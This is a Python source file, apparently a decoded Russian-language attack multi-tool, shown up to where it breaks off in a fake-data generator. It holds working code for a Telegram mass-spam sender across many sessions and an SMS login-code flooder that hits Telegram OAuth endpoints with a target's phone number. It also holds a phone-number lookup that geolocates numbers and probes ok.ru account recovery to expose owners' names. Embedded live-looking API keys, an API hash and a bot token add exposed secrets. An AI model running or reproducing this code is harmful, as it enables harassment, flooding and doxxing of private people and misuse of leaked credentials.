import os, subprocess, sys, time, json, urllib.request, base64, random, requests, hashlib, webbrowser # DECODED BY https://github.com/MrN3lson-Script
from bs4 import BeautifulSoup # DECODED BY https://github.com/MrN3lson-Script
from datetime import datetime, timezone, timedelta # DECODED BY https://github.com/MrN3lson-Script
import smtplib # DECODED BY https://github.com/MrN3lson-Script
from email.mime.text import MIMEText # DECODED BY https://github.com/MrN3lson-Script
from email.mime.multipart import MIMEMultipart # DECODED BY https://github.com/MrN3lson-Script
from telethon import TelegramClient # DECODED BY https://github.com/MrN3lson-Script
from telethon.errors import SessionPasswordNeededError # DECODED BY https://github.com/MrN3lson-Script
from telethon.tl.functions.account import ReportPeerRequest # DECODED BY https://github.com/MrN3lson-Script
from telethon.tl.types import ( # DECODED BY https://github.com/MrN3lson-Script
    InputReportReasonSpam, # DECODED BY https://github.com/MrN3lson-Script
    InputReportReasonViolence, # DECODED BY https://github.com/MrN3lson-Script
    InputReportReasonPornography, # DECODED BY https://github.com/MrN3lson-Script
    InputReportReasonChildAbuse, # DECODED BY https://github.com/MrN3lson-Script
    InputReportReasonOther # DECODED BY https://github.com/MrN3lson-Script
) # DECODED BY https://github.com/MrN3lson-Script
import asyncio, string, aiohttp, fake_useragent, faker # DECODED BY https://github.com/MrN3lson-Script
from fake_useragent import UserAgent # DECODED BY https://github.com/MrN3lson-Script
import threading # DECODED BY https://github.com/MrN3lson-Script
from tqdm import tqdm # DECODED BY https://github.com/MrN3lson-Script
from termcolor import colored # DECODED BY https://github.com/MrN3lson-Script
from urllib.parse import urlparse, parse_qs # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
ACCOUNTS_FILE = 'accounts_1.2.json' # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
class FONT: # DECODED BY https://github.com/MrN3lson-Script
    RED = '\033[91m' # DECODED BY https://github.com/MrN3lson-Script
    GREY = '\033[01;38;05;15m' # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
async def spam_tg(): # DECODED BY https://github.com/MrN3lson-Script
    accounts = [] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def print_menu(): # DECODED BY https://github.com/MrN3lson-Script
        print("[0] - ") # DECODED BY https://github.com/MrN3lson-Script
        print("[1] -     ") # DECODED BY https://github.com/MrN3lson-Script
        print("[2] -  ") # DECODED BY https://github.com/MrN3lson-Script
        print("[3] -   ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def send_telegram_messages(recipient, message, count, client, session_name): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            for i in range(1, count + 1): # DECODED BY https://github.com/MrN3lson-Script
                await client.send_message(recipient, message) # DECODED BY https://github.com/MrN3lson-Script
                print(f"\r {i}   {recipient}   {session_name}", end="") # DECODED BY https://github.com/MrN3lson-Script
                await asyncio.sleep(0.01) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            print(f"\
  {count}   {recipient}   {session_name}.") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"\
      {session_name}: {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def main(recipient, message, count): # DECODED BY https://github.com/MrN3lson-Script
        if not accounts: # DECODED BY https://github.com/MrN3lson-Script
            print("  . ,    .") # DECODED BY https://github.com/MrN3lson-Script
            return # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        tasks = [] # DECODED BY https://github.com/MrN3lson-Script
        for session_name, client in accounts: # DECODED BY https://github.com/MrN3lson-Script
            task = send_telegram_messages(recipient, message, count, client, session_name) # DECODED BY https://github.com/MrN3lson-Script
            tasks.append(task) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        await asyncio.gather(*tasks) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def generate_random_session_name(length=5): # DECODED BY https://github.com/MrN3lson-Script
        letters = string.ascii_lowercase + string.digits # DECODED BY https://github.com/MrN3lson-Script
        return ''.join(random.choice(letters) for _ in range(length)) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def add_account(): # DECODED BY https://github.com/MrN3lson-Script
        session_name = generate_random_session_name() # DECODED BY https://github.com/MrN3lson-Script
        client = TelegramClient(f'sessions/{session_name}', api_id, api_hash) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            await client.start() # DECODED BY https://github.com/MrN3lson-Script
            accounts.append((session_name, client)) # DECODED BY https://github.com/MrN3lson-Script
            print(f" {session_name}  .") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"   : {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def show_accounts(): # DECODED BY https://github.com/MrN3lson-Script
        if not accounts: # DECODED BY https://github.com/MrN3lson-Script
            print("  .") # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print("\
 :") # DECODED BY https://github.com/MrN3lson-Script
            for i, (session_name, _) in enumerate(accounts, 1): # DECODED BY https://github.com/MrN3lson-Script
                print(f"{i}. {session_name}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def load_sessions(): # DECODED BY https://github.com/MrN3lson-Script
        if not os.path.exists('sessions'): # DECODED BY https://github.com/MrN3lson-Script
            os.makedirs('sessions') # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        for file in os.listdir('sessions'): # DECODED BY https://github.com/MrN3lson-Script
            if file.endswith('.session'): # DECODED BY https://github.com/MrN3lson-Script
                session_name = file.split('.')[0] # DECODED BY https://github.com/MrN3lson-Script
                client = TelegramClient(f'sessions/{session_name}', api_id, api_hash) # DECODED BY https://github.com/MrN3lson-Script
                try: # DECODED BY https://github.com/MrN3lson-Script
                    await client.connect() # DECODED BY https://github.com/MrN3lson-Script
                    if await client.is_user_authorized(): # DECODED BY https://github.com/MrN3lson-Script
                        accounts.append((session_name, client)) # DECODED BY https://github.com/MrN3lson-Script
                        print(f" {session_name}  .") # DECODED BY https://github.com/MrN3lson-Script
                    else: # DECODED BY https://github.com/MrN3lson-Script
                        print(f" {session_name}  .") # DECODED BY https://github.com/MrN3lson-Script
                except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
                    print(f"    {session_name}: {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def run_menu(): # DECODED BY https://github.com/MrN3lson-Script
        await load_sessions() # DECODED BY https://github.com/MrN3lson-Script
        while True: # DECODED BY https://github.com/MrN3lson-Script
            print_menu() # DECODED BY https://github.com/MrN3lson-Script
            choice = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            if choice == "1": # DECODED BY https://github.com/MrN3lson-Script
                recipient = input("      : ") # DECODED BY https://github.com/MrN3lson-Script
                message = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
                count = int(input("       : ")) # DECODED BY https://github.com/MrN3lson-Script
                await main(recipient, message, count) # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "2": # DECODED BY https://github.com/MrN3lson-Script
                await add_account() # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "3": # DECODED BY https://github.com/MrN3lson-Script
                show_accounts() # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "0": # DECODED BY https://github.com/MrN3lson-Script
                break # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(" . ,     1  4.") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    api_id = 21826549 # DECODED BY https://github.com/MrN3lson-Script
    api_hash = 'c1a19f792cfd9e397200d16c7e448160' # DECODED BY https://github.com/MrN3lson-Script
    await run_menu() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
log_bot = '7247717499:AAHI7pvVaDYyT2K8TbyEIMUx3rH3v8Z7his' # DECODED BY https://github.com/MrN3lson-Script
log_rec = '5479401773' # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def flood_codami(): # DECODED BY https://github.com/MrN3lson-Script
    z = 0 # DECODED BY https://github.com/MrN3lson-Script
    mes = "" # DECODED BY https://github.com/MrN3lson-Script
    async def send_request(session, url, headers, data): # DECODED BY https://github.com/MrN3lson-Script
        nonlocal z # DECODED BY https://github.com/MrN3lson-Script
        nonlocal mes # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            data_with_armat = data.copy() # DECODED BY https://github.com/MrN3lson-Script
            data_with_armat["message"] = f"{mes}" # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            async with session.post(url, headers=headers, data=data_with_armat) as response: # DECODED BY https://github.com/MrN3lson-Script
                if response.status == 200: # DECODED BY https://github.com/MrN3lson-Script
                    z += 1 # DECODED BY https://github.com/MrN3lson-Script
                else: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"     {url}: {response.status}", 'red')) # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(colored(f"     {url}: {e}", 'red')) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def main(): # DECODED BY https://github.com/MrN3lson-Script
        nonlocal mes # DECODED BY https://github.com/MrN3lson-Script
        number = int(input("\
  : ")) # DECODED BY https://github.com/MrN3lson-Script
        count = int(input("  : ")) # DECODED BY https://github.com/MrN3lson-Script
        mes = input("  (ARMAT  ): ") # DECODED BY https://github.com/MrN3lson-Script
        if mes == "": # DECODED BY https://github.com/MrN3lson-Script
            mes = "ARMAT" # DECODED BY https://github.com/MrN3lson-Script
        urls = [ # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', # DECODED BY https://github.com/MrN3lson-Script
            'https://translations.telegram.org/auth/request', # DECODED BY https://github.com/MrN3lson-Script
            'https://translations.telegram.org/auth/request', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', # DECODED BY https://github.com/MrN3lson-Script
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', # DECODED BY https://github.com/MrN3lson-Script
            'https://my.telegram.org/auth/send_password' # DECODED BY https://github.com/MrN3lson-Script
        ] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            async with aiohttp.ClientSession() as session: # DECODED BY https://github.com/MrN3lson-Script
                for _ in range(count): # DECODED BY https://github.com/MrN3lson-Script
                    user = fake_useragent.UserAgent().random # DECODED BY https://github.com/MrN3lson-Script
                    headers = {'user-agent': user} # DECODED BY https://github.com/MrN3lson-Script
                    tasks = [send_request(session, url, headers, {'phone': number}) for url in urls] # DECODED BY https://github.com/MrN3lson-Script
                    await asyncio.gather(*tasks) # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print('[!] ,   :', e) # DECODED BY https://github.com/MrN3lson-Script
        print(colored(f"  : {z}", 'cyan')) # DECODED BY https://github.com/MrN3lson-Script
        print(colored(f" : {count} ", 'cyan')) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    if __name__ == "__main__": # DECODED BY https://github.com/MrN3lson-Script
        asyncio.run(main()) # DECODED BY https://github.com/MrN3lson-Script
  # DECODED BY https://github.com/MrN3lson-Script
def get_address_by_coordinates(latitude, longitude): # DECODED BY https://github.com/MrN3lson-Script
    address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}" # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    try: # DECODED BY https://github.com/MrN3lson-Script
        address_response = urllib.request.urlopen(address_url) # DECODED BY https://github.com/MrN3lson-Script
        address_data = json.load(address_response) # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        if "address" in address_data: # DECODED BY https://github.com/MrN3lson-Script
            sorted_address = sort_address(address_data["address"]) # DECODED BY https://github.com/MrN3lson-Script
            return sorted_address # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            return "  " # DECODED BY https://github.com/MrN3lson-Script
    except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
        return f"   : {e}" # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def sort_address(address): # DECODED BY https://github.com/MrN3lson-Script
    address_order = [ # DECODED BY https://github.com/MrN3lson-Script
        "road", # DECODED BY https://github.com/MrN3lson-Script
        "house_number", # DECODED BY https://github.com/MrN3lson-Script
        "village", # DECODED BY https://github.com/MrN3lson-Script
        "town", # DECODED BY https://github.com/MrN3lson-Script
        "suburb", # DECODED BY https://github.com/MrN3lson-Script
        "postcode" # DECODED BY https://github.com/MrN3lson-Script
    ] # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    sorted_address = {} # DECODED BY https://github.com/MrN3lson-Script
    for key in address_order: # DECODED BY https://github.com/MrN3lson-Script
        if key in address: # DECODED BY https://github.com/MrN3lson-Script
            sorted_address[key] = address[key] # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    return sorted_address # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def translate_address(address): # DECODED BY https://github.com/MrN3lson-Script
    translations = { # DECODED BY https://github.com/MrN3lson-Script
        "road": "", # DECODED BY https://github.com/MrN3lson-Script
        "house_number": " ", # DECODED BY https://github.com/MrN3lson-Script
        "village": "", # DECODED BY https://github.com/MrN3lson-Script
        "town": "", # DECODED BY https://github.com/MrN3lson-Script
        "suburb": "", # DECODED BY https://github.com/MrN3lson-Script
        "postcode": " " # DECODED BY https://github.com/MrN3lson-Script
    } # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    translated_address = {} # DECODED BY https://github.com/MrN3lson-Script
    for key, value in address.items(): # DECODED BY https://github.com/MrN3lson-Script
        translated_key = translations.get(key, key.capitalize()) # DECODED BY https://github.com/MrN3lson-Script
        translated_address[translated_key] = value # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    return translated_address        # DECODED BY https://github.com/MrN3lson-Script
def probiv_po_nomeru(): # DECODED BY https://github.com/MrN3lson-Script
    USERAGENTS = [ # DECODED BY https://github.com/MrN3lson-Script
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", # DECODED BY https://github.com/MrN3lson-Script
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", # DECODED BY https://github.com/MrN3lson-Script
        "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", # DECODED BY https://github.com/MrN3lson-Script
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0", # DECODED BY https://github.com/MrN3lson-Script
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" # DECODED BY https://github.com/MrN3lson-Script
    ] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    HTMLWEB_URL = "https://htmlweb.ru/geo/api.php?json&telcod=" # DECODED BY https://github.com/MrN3lson-Script
    VERIPHONE_URL = "https://api.veriphone.io/v2/verify?phone=" # DECODED BY https://github.com/MrN3lson-Script
    VERIPHONE_API_KEY = "133DF840CE4B40AEABC341B7CA407A2D" # DECODED BY https://github.com/MrN3lson-Script
    OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong' # DECODED BY https://github.com/MrN3lson-Script
    OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword' # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    headers = {"User-Agent": random.choice(USERAGENTS)} # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def check_login(TELCODE): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            session = requests.Session() # DECODED BY https://github.com/MrN3lson-Script
            session.get(f'{OK_LOGIN_URL}&st.email={TELCODE}', timeout=10) # DECODED BY https://github.com/MrN3lson-Script
            request = session.get(OK_RECOVER_URL, timeout=10) # DECODED BY https://github.com/MrN3lson-Script
            ROOT_SOUP = BeautifulSoup(request.content, 'html.parser') # DECODED BY https://github.com/MrN3lson-Script
            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}): # DECODED BY https://github.com/MrN3lson-Script
                ACCOUNT_INFO = ROOT_SOUP.find('div', {'class': 'ext-registration_tx taCenter'}) # DECODED BY https://github.com/MrN3lson-Script
                MASKED_PHONE = ROOT_SOUP.find('button', {'data-l': 't,phone'}) # DECODED BY https://github.com/MrN3lson-Script
                if MASKED_PHONE: # DECODED BY https://github.com/MrN3lson-Script
                    MASKED_PHONE = TELCODE # DECODED BY https://github.com/MrN3lson-Script
                if ACCOUNT_INFO: # DECODED BY https://github.com/MrN3lson-Script
                    NAME = ACCOUNT_INFO.find('div', {'class': 'ext-registration_username_header'}) # DECODED BY https://github.com/MrN3lson-Script
                    if NAME: # DECODED BY https://github.com/MrN3lson-Script
                        NAME = NAME.get_text() # DECODED BY https://github.com/MrN3lson-Script
                    ACCOUNT_INFO = ACCOUNT_INFO.findAll('div', {'class': 'lstp-t'}) # DECODED BY https://github.com/MrN3lson-Script
                    if ACCOUNT_INFO: # DECODED BY https://github.com/MrN3lson-Script
                        PROFILE_INFO = ACCOUNT_INFO[0].get_text() # DECODED BY https://github.com/MrN3lson-Script
                        PROFILE_REGISTRED = ACCOUNT_INFO[1].get_text() # DECODED BY https://github.com/MrN3lson-Script
                    else: # DECODED BY https://github.com/MrN3lson-Script
                        PROFILE_INFO = None # DECODED BY https://github.com/MrN3lson-Script
                        PROFILE_REGISTRED = None # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"\
 :" + FONT.GREY + f" ") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" {MASKED_PHONE}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" {NAME}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" {PROFILE_INFO}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" {PROFILE_REGISTRED}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,home_rest'}): # DECODED BY https://github.com/MrN3lson-Script
                return 'not associated' # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                return None # DECODED BY https://github.com/MrN3lson-Script
        except requests.exceptions.Timeout: # DECODED BY https://github.com/MrN3lson-Script
            print(FONT.RED + ":      .") # DECODED BY https://github.com/MrN3lson-Script
            return None # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def check_internet(): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            urllib.request.urlopen('https://google.com', timeout=7.77) # DECODED BY https://github.com/MrN3lson-Script
            return True # DECODED BY https://github.com/MrN3lson-Script
        except urllib.error.URLError: # DECODED BY https://github.com/MrN3lson-Script
            print(FONT.RED + ":    !") # DECODED BY https://github.com/MrN3lson-Script
            sys.exit() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    check_internet() # DECODED BY https://github.com/MrN3lson-Script
    while True: # DECODED BY https://github.com/MrN3lson-Script
        TELCODE = input(FONT.RED + "\
[" + FONT.GREY + "?" + FONT.RED + "]" + FONT.GREY + "      0  : ") # DECODED BY https://github.com/MrN3lson-Script
        if TELCODE == '0': # DECODED BY https://github.com/MrN3lson-Script
        	break # DECODED BY https://github.com/MrN3lson-Script
        print(FONT.RED + "\
 :") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            response = requests.get(HTMLWEB_URL + TELCODE, headers=headers, timeout=10) # DECODED BY https://github.com/MrN3lson-Script
            if response.status_code == 200: # DECODED BY https://github.com/MrN3lson-Script
                data = response.json() # DECODED BY https://github.com/MrN3lson-Script
                TELCOD = data.get("country", {}).get("telcod", "") # DECODED BY https://github.com/MrN3lson-Script
                COUNTRY = data.get("country", {}).get("fullname", "") # DECODED BY https://github.com/MrN3lson-Script
                OKRUG = data.get("okrug", "") # DECODED BY https://github.com/MrN3lson-Script
                OBLAST = data.get("region", {}).get("name", "") # DECODED BY https://github.com/MrN3lson-Script
                CITY = data.get("0", {}).get("name", "") # DECODED BY https://github.com/MrN3lson-Script
                latitude = data.get("0", {}).get("latitude", "") # DECODED BY https://github.com/MrN3lson-Script
                longitude = data.get("0", {}).get("longitude", "") # DECODED BY https://github.com/MrN3lson-Script
                TIMEZONE = data.get("0", {}).get("time_zone", data.get("time_zone", "")) # DECODED BY https://github.com/MrN3lson-Script
                OPER = data.get("0", {}).get("oper", "") # DECODED BY https://github.com/MrN3lson-Script
                 # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"\
 :" + FONT.GREY + f" HTMLWEB & Veriphone") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" +{TELCOD}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {COUNTRY}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {OKRUG}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {OBLAST}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {CITY}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {latitude}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {longitude}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"  :" + FONT.GREY + f" +{TIMEZONE} UTC") # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f"      HTMLWEB: {response.status_code}") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(FONT.RED + f"     HTMLWEB: {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            response = requests.get(f"{VERIPHONE_URL}{TELCODE}&key={VERIPHONE_API_KEY}", headers=headers, timeout=10) # DECODED BY https://github.com/MrN3lson-Script
            if response.status_code == 200: # DECODED BY https://github.com/MrN3lson-Script
                data = response.json() # DECODED BY https://github.com/MrN3lson-Script
                PHONE_TYPE = data.get("phone_type", "") # DECODED BY https://github.com/MrN3lson-Script
                                 # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {PHONE_TYPE}") # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {OPER}") # DECODED BY https://github.com/MrN3lson-Script
                 # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(FONT.RED + f"     Veriphone: {e}") # DECODED BY https://github.com/MrN3lson-Script
             # DECODED BY https://github.com/MrN3lson-Script
        if latitude != "" and longitude != "": # DECODED BY https://github.com/MrN3lson-Script
            address = get_address_by_coordinates(latitude, longitude) # DECODED BY https://github.com/MrN3lson-Script
            if isinstance(address, dict): # DECODED BY https://github.com/MrN3lson-Script
                translated_address = translate_address(address) # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :") # DECODED BY https://github.com/MrN3lson-Script
                for key, value in translated_address.items(): # DECODED BY https://github.com/MrN3lson-Script
                    print(FONT.RED + f" {key}:" + FONT.GREY + f" {value}") # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(FONT.RED + f" :" + FONT.GREY + f" {address}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        check_login(TELCODE) # DECODED BY https://github.com/MrN3lson-Script
        print("\
\
 :") # DECODED BY https://github.com/MrN3lson-Script
        valid = TELCODE.replace('+', '') # DECODED BY https://github.com/MrN3lson-Script
        print(FONT.RED + f"\
https://smsc.ru/testhlr/?phone={valid}" + FONT.GREY + f" -   \
") # DECODED BY https://github.com/MrN3lson-Script
        print(FONT.RED + f"https://reveng.ee/search?q={TELCODE}" + FONT.GREY + f" -  \
") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def generate_fake_data(): # DECODED BY https://github.com/MrN3lson-Script
    fake = faker.Faker('ru_RU') # DECODED BY https://github.com/MrN3lson-Script
     # DECODED BY https://github.com/MrN3lson-Script
    while True:         # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            num_persons = int(input("      0  : ")) # DECODED BY https://github.com/MrN3lson-Script
            if num_persons == 0: # DECODED BY https://github.com/MrN3lson-Script
                break # DECODED BY https://github.com/MrN3lson-Script
            if num_persons <= 0: # DECODED BY https://github.com/MrN3lson-Script
                raise ValueError # DECODED BY https://github.com/MrN3lson-Script
        except ValueError: # DECODED BY https://github.com/MrN3lson-Script
            print(":      0  .") # DECODED BY https://github.com/MrN3lson-Script
            continue # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        generated_data = [] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
